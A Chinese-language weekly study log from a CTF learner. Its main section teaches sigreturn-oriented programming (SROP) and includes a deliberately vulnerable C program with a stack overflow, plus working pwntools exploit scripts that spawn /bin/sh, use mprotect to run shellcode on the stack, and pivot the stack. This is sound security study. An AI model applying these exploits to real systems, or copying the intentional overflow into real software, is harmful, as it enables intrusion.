# <font style="color:rgb(38, 38, 38);">完成事项</font>
+ **汇编书籍阅读**
+ **比赛**
+ **新的漏洞利用方法**

# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
+ **书籍阅读**
+ **Hgame,furryCTF,shCTF, Unictf总结**
+ 数据结构
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## SROP
### 介绍
**是一种利用类 Unix 系统信号处理机制 ROP 技术**
- **核心原理**：利用系统调用 sigreturn 会将栈上的数据无条件地恢复到 CPU 寄存器这一特性，攻击者通过在栈上伪造一个 Sigcontext 结构体，从而一次性控制**所有**寄存器（包括 EIP/RIP, ESP/RSP）。


#### 2. 为什么需要 SROP?

在常规 ROP 中，我们需要寻找大量的 Gadgets（如 pop eax; ret, pop ebx; ret）来逐个设置寄存器。

- 如果 Gadget 匮乏，或者栈空间有限，常规 ROP 很难构造。
    
- **SROP 优势**：只需要两个条件即可控制所有寄存器：
    
    1. 栈溢出（足够大以放下 Sigcontext 结构）。
        
    2. 一个系统调用指令（syscall 或 int 0x80）。
        

#### 3. 攻击流程

1. **触发信号 (正常流程)**：当进程接收到信号（如 SIGSEGV）时，内核会将当前的寄存器状态保存到栈上（称为 Signal Frame），然后跳转到信号处理函数。处理完后，调用 sigreturn 系统调用，内核从栈上读取 Signal Frame 恢复寄存器，进程继续运行。
    
2. **攻击利用：
    
    - 1.攻击者利用栈溢出，在栈上写入伪造的 Signal Frame（将 EIP 指向 syscall，EAX 设置为 execve，EBX 指向 /bin/sh 等）。
        
    - 2. 攻击者控制 EAX 寄存器为 sigreturn 的系统调用号（32位是 119，64位是 15）。
        
    - 3.攻击者执行系统调用指令（int 0x80 或 syscall）。
        
    - 4. 内核误以为这是正常的信号返回，将栈上伪造的数据“恢复”到寄存器中。
        
    - 5.CPU 状态被完全劫持。

#### 4.示例
```c
#include <unistd.h>
#include <stdlib.h>
// 为了演示，直接内嵌一个 syscall gadget
void gadgets() {
    __asm__("syscall; ret");
}

void vuln() {
    char buf[16];
    read(0, buf, 0x400);
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    vuln();
    return 0;
}
```

```python
from pwn import *


context.binary = './srop'
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

p = process('./srop')
elf = ELF('./srop')

rop = ROP(elf)
syscall_addr = rop.find_gadget(['syscall', 'ret']).address

vuln_addr = elf.symbols['vuln']
bin_sh_addr = next(elf.search(b"/bin/sh"))


frame = SigreturnFrame()
frame.rax = constants.SYS_execve 
frame.rdi = bin_sh_addr       
frame.rsi = 0                  
frame.rdx = 0                   
frame.rip = syscall_addr         


payload = b'A' * 24
payload += p64(vuln_addr)      
payload += p64(syscall_addr)     
payload += bytes(frame)         

p.send(payload)
time.sleep(0.1) 


p.send(b'B' * 15)

p.interactive()
```
### 其他场景
#### mprotect (绕过 NX 执行 Shellcode)
```python

frame_mprotect = SigreturnFrame()
frame_mprotect.rax = constants.SYS_mprotect # 系统调用号 10
frame_mprotect.rdi = stack_addr & 0xfffff000 # 栈所在的页地址 (必须页对齐)
frame_mprotect.rsi = 0x1000                 # 长度
frame_mprotect.rdx = 7                      # 权限 RWX
frame_mprotect.rsp = stack_addr + 0x100     
frame_mprotect.rip = stack_addr + 0x108    


payload = b'A' * 24
payload += p64(vuln_addr)     
payload += p64(syscall_addr)  
payload += bytes(frame_mprotect) 
payload += asm(shellcode)    

p.send(payload)
time.sleep(0.1)
p.send(b'B' * 15) # 触发 Sigreturn
```
#### 栈迁移
```python
bss_addr = 0x404000

frame_pivot = SigreturnFrame()
frame_pivot.rsp = bss_addr      
frame_pivot.rip = syscall_addr   # 例如继续用 SROP 来打 ，这时需要再提前布局另一个 frame
                                # 也可以再接 ROP
payload = b'A' * 24
payload += p64(vuln_addr)
payload += p64(syscall_addr)
payload += bytes(frame_pivot) 

p.send(payload)
time.sleep(0.1)
p.send(b'B' * 15) 
```
---






# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
**了解了8086实模式相关机制，对 SROP 进行了一定学习 ，对 ret2dlresolve 进行了简单的了解**



# <font style="color:rgb(38, 38, 38);">杂项</font>
+ 学车车
